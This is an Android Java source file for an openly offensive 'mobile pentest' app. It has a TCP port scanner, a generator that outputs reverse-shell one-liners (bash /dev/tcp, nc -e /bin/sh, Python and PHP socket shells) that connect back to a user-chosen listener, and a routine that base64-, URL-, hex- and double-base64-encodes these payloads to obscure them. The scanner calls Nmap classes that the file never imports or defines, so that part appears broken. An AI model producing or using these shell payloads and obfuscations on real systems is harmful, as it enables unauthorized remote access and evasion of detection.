package com.offensive.mobilepentest;

import android.os.Bundle;
import android.util.Base64;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.util.List;
import java.util.ArrayList;
import java.io.IOException;
import java.net.InetAddress;
import java.net.UnknownHostException;
import java.util.concurrent.ExecutionException;
import java.nio.charset.StandardCharsets;
import java.net.URLEncoder;

public class MainActivity extends AppCompatActivity {
    
    private EditText targetIpEditText, portRangeEditText, lhostEditText, lportEditText;
    private Button scanButton, shellButton, obfuscateButton;
    private TextView resultTextView;
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        // Initialize UI components
        targetIpEditText = findViewById(R.id.targetIpEditText);
        portRangeEditText = findViewById(R.id.portRangeEditText);
        lhostEditText = findViewById(R.id.lhostEditText);
        lportEditText = findViewById(R.id.lportEditText);
        scanButton = findViewById(R.id.scanButton);
        shellButton = findViewById(R.id.shellButton);
        obfuscateButton = findViewById(R.id.obfuscateButton);
        resultTextView = findViewById(R.id.resultTextView);
        
        // Set default values
        targetIpEditText.setText("192.168.1.1");
        portRangeEditText.setText("1-1000");
        lhostEditText.setText("10.0.0.5");
        lportEditText.setText("4444");
        
        // Network scan button
        scanButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                String target = targetIpEditText.getText().toString();
                String ports = portRangeEditText.getText().toString();
                new Thread(new Runnable() {
                    @Override
                    public void run() {
                        final String result = networkScan(target, ports);
                        runOnUiThread(new Runnable() {
                            @Override
                            public void run() {
                                resultTextView.setText(result);
                            }
                        });
                    }
                }).start();
            }
        });
        
        // Reverse shell button
        shellButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                String lhost = lhostEditText.getText().toString();
                String lport = lportEditText.getText().toString();
                final String shell = generateReverseShell(lhost, lport);
                runOnUiThread(new Runnable() {
                    @Override
                    public void run() {
                        resultTextView.setText("Reverse Shell Payload:\n" + shell);
                    }
                });
            }
        });
        
        // Obfuscate button
        obfuscateButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                String payload = resultTextView.getText().toString();
                if (payload.contains("Reverse Shell Payload:")) {
                    String shell = payload.replace("Reverse Shell Payload:\n", "");
                    final String obfuscated = obfuscatePayload(shell);
                    runOnUiThread(new Runnable() {
                        @Override
                        public void run() {
                            resultTextView.setText("Obfuscated Payload:\n" + obfuscated);
                        }
                    });
                } else {
                    Toast.makeText(MainActivity.this, "Generate a shell first", Toast.LENGTH_SHORT).show();
                }
            }
        });
    }
    
    private String networkScan(String target, String ports) {
        StringBuilder result = new StringBuilder();
        result.append("=== Nmap Port Scanner ===\n");
        result.append("Target: ").append(target).append("\n");
        result.append("Ports: ").append(ports).append("\n\n");
        
        try {
            Nmap nmap = new Nmap();
            List<Nmap.PortSpec> portList = new ArrayList<>();
            
            // Parse port ranges
            String[] portRanges = ports.split(",");
            for (String range : portRanges) {
                range = range.trim();
                if (range.contains("-")) {
                    String[] parts = range.split("-");
                    int start = Integer.parseInt(parts[0].trim());
                    int end = Integer.parseInt(parts[1].trim());
                    // Limit to prevent scanning too many ports
                    if (end - start > 1000) {
                        end = start + 1000;
                        result.append("[!] Limited to 1000 ports per range\n");
                    }
                    for (int port = start; port <= end; port++) {
                        portList.add(new Nmap.PortSpec(port, "tcp"));
                    }
                } else {
                    int port = Integer.parseInt(range);
                    portList.add(new Nmap.PortSpec(port, "tcp"));
                }
            }
            
            result.append("[*] Scanning ").append(portList.size()).append(" ports...\n\n");
            
            // Perform the scan
            List<InetAddress> targets = new ArrayList<>();
            targets.add(InetAddress.getByName(target));
            NmapScan scan = nmap.scan(targets, portList);
            
            // Process the results
            int openCount = 0;
            for (NmapHost host : scan.getHosts()) {
                for (NmapPort port : host.getPorts()) {
                    if (port.isOpen()) {
                        result.append("[+] Port ").append(port.getPort())
                              .append("/").append(port.getProtocol())
                              .append(" OPEN");
                        if (port.getService() != null && !port.getService().equals("unknown")) {
                            result.append(" - ").append(port.getService());
                        }
                        if (port.getBanner() != null) {
                            String banner = port.getBanner();
                            if (banner.length() > 50) {
                                banner = banner.substring(0, 50) + "...";
                            }
                            result.append("\n    Banner: ").append(banner);
                        }
                        result.append("\n");
                        openCount++;
                    }
                }
            }
            
            result.append("\n[*] Scan complete in ").append(scan.getScanTime()).append("ms\n");
            result.append("[*] Open ports: ").append(openCount).append("\n");
            
            nmap.shutdown();
            
        } catch (Exception e) {
            result.append("[-] Error: ").append(e.getMessage()).append("\n");
        }
        
        return result.toString();
    }
    
    private String generateReverseShell(String lhost, String lport) {
        StringBuilder shells = new StringBuilder();
        
        // Generate multiple shell variants
        shells.append("=== Reverse Shell Payloads ===\n\n");
        
        String bashPayload = "bash -i >& /dev/tcp/" + lhost + "/" + lport + " 0>&1";
        shells.append("1. Bash:\n   ").append(bashPayload).append("\n\n");
        
        // Base64 encoded version
        byte[] data = bashPayload.getBytes(StandardCharsets.UTF_8);
        String encodedPayload = Base64.encodeToString(data, Base64.NO_WRAP);
        shells.append("2. Base64 Bash:\n   echo ").append(encodedPayload)
              .append(" | base64 -d | bash\n\n");
        
        shells.append("3. Netcat:\n   nc -e /bin/sh ").append(lhost)
              .append(" ").append(lport).append("\n\n");
        
        shells.append("4. Python:\n   python -c 'import socket,subprocess,os;")
              .append("s=socket.socket();s.connect((\"").append(lhost)
              .append("\",").append(lport).append("));")
              .append("os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);")
              .append("subprocess.call([\"/bin/sh\",\"-i\"])'\n\n");
        
        shells.append("5. PHP:\n   php -r '$s=fsockopen(\"").append(lhost)
              .append("\",").append(lport).append(");exec(\"/bin/sh -i <&3 >&3 2>&3\");'\n");
        
        return shells.toString();
    }
    
    private String obfuscatePayload(String payload) {
        StringBuilder result = new StringBuilder();
        result.append("=== Obfuscated Payloads ===\n\n");
        
        try {
            byte[] data = payload.getBytes(StandardCharsets.UTF_8);
            
            // Base64 encode
            String base64Encoded = Base64.encodeToString(data, Base64.NO_WRAP);
            result.append("1. Base64:\n   ").append(base64Encoded).append("\n\n");
            
            // URL encode
            String urlEncoded = URLEncoder.encode(payload, StandardCharsets.UTF_8.toString());
            result.append("2. URL Encoded:\n   ").append(urlEncoded).append("\n\n");
            
            // Hex encode
            StringBuilder hex = new StringBuilder();
            for (byte b : data) {
                hex.append(String.format("\\x%02x", b));
            }
            result.append("3. Hex:\n   ").append(hex.toString()).append("\n\n");
            
            // Double Base64
            String doubleBase64 = Base64.encodeToString(
                base64Encoded.getBytes(StandardCharsets.UTF_8), Base64.NO_WRAP);
            result.append("4. Double Base64:\n   ").append(doubleBase64).append("\n");
            
        } catch (Exception e) {
            result.append("Error obfuscating payload: ").append(e.getMessage());
        }
        
        return result.toString();
    }
}
